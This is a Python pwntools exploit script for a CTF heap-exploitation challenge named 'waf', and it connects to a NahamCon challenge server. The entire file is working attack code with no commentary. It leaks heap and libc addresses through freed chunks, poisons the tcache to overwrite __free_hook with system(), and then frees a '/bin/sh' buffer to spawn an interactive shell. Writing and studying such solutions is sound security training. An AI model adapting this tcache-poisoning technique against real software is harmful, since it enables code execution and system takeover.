#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./waf"
libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("challenge.nahamcon.com", 31443)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
        #b *print_config+92
        #b *edit_config+107
        #b *edit_config+318
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


def alloc(id: int, buf, active: bool):
    size = len(buf)
    p.sendlineafter('>', '1')
    p.sendlineafter(':', str(id))
    p.sendlineafter(':', str(size))
    p.sendafter(':', buf)
    if active == True:
        p.sendlineafter(':', 'y')
    else:
        p.sendlineafter(':', 'n')

def edit(idx: int, id: int, buf, active: bool):
    size = len(buf)
    p.sendlineafter('>', '2')
    p.sendlineafter(':', str(idx))
    p.sendlineafter(':', str(id))
    p.sendlineafter(':', str(size))
    p.sendafter(':', buf)
    if active == True:
        p.sendlineafter(':', 'y')
    else:
        p.sendlineafter(':', 'n')

def show(idx: int):
    p.sendlineafter('>', '3')
    p.sendlineafter(':', str(idx))

def free():
    p.sendlineafter('>', '4')


# leak heap address
alloc(0xdeadbeef, b'A' * 0x120, False)# 0
alloc(0xdeadbeef, b'B' * 0x100, False)# 1

free()# 1
free()# 0

show(0)
p.recvuntil("ID: ")
leak = eval(p.recvline().rstrip())
log.info("leak: " + hex(leak))
heap_base = leak - 0x3b0
log.info("heap base: " + hex(heap_base))

# fill tcache and send chunk to unsorted bin
for i in range(8):
    alloc(0xdeadbeef, b'C' * 0x200, False)

for i in range(8):
    free()

show(0)
p.recvuntil("Setting: ")
leak = u64(p.recv(6) + b'\0' * 2)
log.info("leak: " + hex(leak))
libc_base = leak - 0x3ebca0
libc.address = libc_base
log.info("libc base: " + hex(libc_base))


# overwrite __free_hook
__free_hook_addr = libc.symbols["__free_hook"]

alloc(0, b'D' * 0x30, False)
alloc(0, b'E' * 0x30, False)
free()
free()

payload = p64(__free_hook_addr - 0x8)
payload += p64(heap_base + 0x10)
payload += b'F' * 0x8 * 6


edit(0, heap_base + 0xd60, payload, True)

alloc(0, b'G' * 0x40, False)

p.sendlineafter('>', '1')
p.sendlineafter(':', str(0))
p.sendlineafter(':', str(0x40))
p.sendlineafter(':', b'H' * 9 + p64(libc.symbols["system"]) + p64(0))
p.sendlineafter(':', 'n')

alloc(0, b"/bin/sh\0", False)
free()

p.interactive()
